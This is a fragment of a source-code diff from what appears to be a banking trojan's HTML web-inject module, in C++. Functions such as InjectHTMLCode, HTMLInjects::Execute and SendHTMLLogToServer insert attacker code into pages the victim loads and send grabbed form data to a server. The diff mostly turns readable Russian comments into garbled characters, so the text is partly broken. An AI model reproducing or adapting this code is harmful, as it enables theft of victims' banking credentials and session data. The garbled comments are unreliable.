 	DataGrabber::AddData(URL, SendBuffer, UserAgent, BrowserType, DATA_TYPE_INJECT);
 //	SendFormGrabberLogs(URL, SendBuffer, UserAgent, BrowserType, DATA_TYPE_INJECT);
 
@@ -825,7 +836,7 @@ bool SendHTMLLogToServer(PCHAR Buffer, PHTMLInject Inject, PHTTPSessionInfo Sess
 
 bool InjectHTMLCode(PRequest Request, PHTMLInject Inject)
 {
-	// Метод обрабатывает загруженный HTML документ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Request == NULL || Inject == NULL)
 		return false;
 
@@ -834,19 +845,19 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject)
 
 	DWORD Count = List::Count(Inject->Injects);
 	PHTMLInjectData Data;
-	bool Injected = false; // Признак того, что был произведён хотя-бы один инжект
+	bool Injected = false; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 	for (DWORD i = 0; i < Count; i++)
 	{
 		Data = (PHTMLInjectData)List::GetItem(Inject->Injects, i);
 
-		// Обработанные данные игнорируем
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Data->Disabled /*|| Data->State == idsOk*/) continue;
 
-		//  Инжектим HTML код в документ
+		//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Data->Before, Data->Inject, Data->After, NewLen))
 		{
-			// Инжект сработал, обрабатываем данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 			Injected = true;
 			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);
@@ -868,15 +879,15 @@ bool InjectHTMLCode(PRequest Request, PHTMLInject Inject)
 
 bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
 {
-	//  Обработать HTML инжекты.
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	//
-	//  функция возвращает истину если в буффер
-	//  запроса были внесены изменения
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if (Request == NULL || !Request->IsInject)
 		return false;
 
-    Request->Injected = true; // Устанавливаем признак обработанных инжектов
+    Request->Injected = true; // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	bool Result = false;
 	PHTMLInject Inject;
@@ -890,7 +901,7 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
 			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
 		 else
 		 {
-			// Внедряем свой код в загруженные данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			NewBuffer = NULL;
 			if (InjectHTMLCode(Request, Inject))
 				Result = true;
@@ -903,8 +914,8 @@ bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session)
 
 bool HTMLInjects::SupportContentType(PCHAR CType)
 {
-	// Функция возвращает истину если указанный тип контента
-	// поддерживается методами инжекта HTML
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ HTML
 	if (CType == NULL)
 		return false;
 	if (StrSame(CType, "text/", false, 5))
